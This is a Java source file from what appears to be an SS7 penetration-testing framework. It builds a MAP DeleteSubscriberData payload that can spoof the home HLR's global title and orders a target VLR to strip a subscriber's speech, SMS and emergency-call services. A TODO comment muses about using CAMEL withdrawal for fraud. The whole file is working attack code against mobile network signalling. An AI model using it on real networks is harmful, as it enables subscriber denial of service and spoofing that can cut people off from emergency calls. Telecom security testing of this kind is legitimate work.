/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.connectivity.ss7.payloadwrapper.mobility;

import com.rodan.connectivity.ss7.adapter.MapAdapter;
import com.rodan.connectivity.ss7.adapter.SccpAdapter;
import com.rodan.connectivity.ss7.payloadwrapper.JSs7PayloadWrapper;
import com.rodan.connectivity.ss7.service.MapDialogGenerator;
import com.rodan.connectivity.ss7.service.MapMobilityService;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Payload;
import com.rodan.library.model.config.node.config.IntruderNodeConfig;
import com.rodan.library.model.config.node.config.LabNodeConfig;
import com.rodan.library.model.config.node.config.NodeConfig;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import lombok.AccessLevel;
import lombok.Builder;
import lombok.Getter;
import lombok.ToString;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.ExtBasicServiceCode;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.TeleserviceCodeValue;
import org.mobicents.protocols.ss7.map.api.service.supplementary.SSCode;

import java.util.ArrayList;

@Payload(name = Constants.DSD_PAYLOAD_NAME)
@ToString(callSuper = true)
public class DsdPayloadWrapper extends JSs7PayloadWrapper<MapMobilityService, MAPDialogMobility> {
    @Getter(AccessLevel.PRIVATE) private String imsi;
    @Getter(AccessLevel.PRIVATE) private String targetVlrGt;
    @Getter(AccessLevel.PRIVATE) private String spoofHlr;
    @Getter(AccessLevel.PRIVATE) private String targetHlrGt;
    @Getter(AccessLevel.PRIVATE) private String mapVersion;

    @Builder
    public DsdPayloadWrapper(String localGt, int localSsn, int remoteSsn, NodeConfig nodeConfig, SccpAdapter sccpAdapter, 
                             MapAdapter mapAdapter, MapDialogGenerator<MAPDialogMobility> dialogGenerator, String imsi, 
                             String targetVlrGt, String spoofHlr, String targetHlrGt, String mapVersion) {
        super(localGt, localSsn, remoteSsn, nodeConfig, sccpAdapter, mapAdapter, dialogGenerator);
        this.imsi = imsi;
        this.targetVlrGt = targetVlrGt;
        this.spoofHlr = spoofHlr;
        this.targetHlrGt = targetHlrGt;
        this.mapVersion = mapVersion;
    }

    @Override
    public MAPDialogMobility generateCarrier() throws SystemException {
        validate();

        var sccpFactory = getSccpAdapter().getParamFactory();
        var callingStr = "Yes".equalsIgnoreCase(getSpoofHlr()) ? getTargetHlrGt() : getLocalGt();
        var callingGt = sccpFactory.createGlobalTitle(callingStr, TRANSLATION_TYPE, ISDN_TELEPHONY_INDICATOR,
                ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var callingPc = Integer.valueOf(getNodeConfig().getSs7Association().getLocalNode().getPointCode());
        var callingParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, callingGt,
                callingPc, getLocalSsn());
        var calledGt = sccpFactory.createGlobalTitle(getTargetVlrGt(), TRANSLATION_TYPE,
                ISDN_TELEPHONY_INDICATOR, ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var peerNode = (getNodeConfig() instanceof IntruderNodeConfig) ?
                ((IntruderNodeConfig) getNodeConfig()).getSs7Association().getPeerNode() :
                ((LabNodeConfig) getNodeConfig()).getSs7Association().getPeerNode();
        var calledPc = Integer.valueOf(peerNode.getPointCode());
        var calledParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledGt,
                calledPc, getRemoteSsn());

        return dialogGenerator.generate(callingParty, calledParty, getApplicationContext());
    }

    @Override
    public void addToCarrier(MAPDialogMobility dialog) throws SystemException {
        try {
            validate();

            var mapFactory = getMapAdapter().getParamFactory();
            var imsi = mapFactory.createIMSI(getImsi());

            var basicServiceList = new ArrayList<ExtBasicServiceCode>();
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.allSpeechTransmissionServices)));
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.telephony)));
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.emergencyCalls)));
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.allShortMessageServices)));
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.shortMessageMT_PP)));
            basicServiceList.add(mapFactory.createExtBasicServiceCode(mapFactory
                    .createExtTeleserviceCode(TeleserviceCodeValue.shortMessageMO_PP)));
            var ssList = new ArrayList<SSCode>();
//            ssList.add(mapFactory.createSSCode(SupplementaryCodeValue.allSS));
            ssList = null;
            // TODO check if camelSubscriptionInfoWithdraw or SpecificCSIWithdraw can be used for fraud
            // Use EPSSubscriptionDataWithdraw with SGSN with withdraw EPS info

            dialog.addDeleteSubscriberDataRequest(imsi, basicServiceList, ssList, false,
                    null, false, false, false,
                    null, null, false,
                    null, false, false, null,
                    true, false, null, false,
                    false);

        } catch (MAPException e) {
            var msg = "Failed to add CL to dialog";
            logger.error(msg, e);
            throw SystemException.builder().code(ErrorCode.MAP_INITIALIZATION).message(msg).parent(e).build();
        }
    }

    @Override
    protected MAPApplicationContext getApplicationContext() throws SystemException {
        Integer[] supportedVersions = {1, 2, 3};
        var mapContextVersion = getAcVersion(Integer.parseInt(getMapVersion()), supportedVersions);
        return MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberDataMngtContext, mapContextVersion);
    }
}
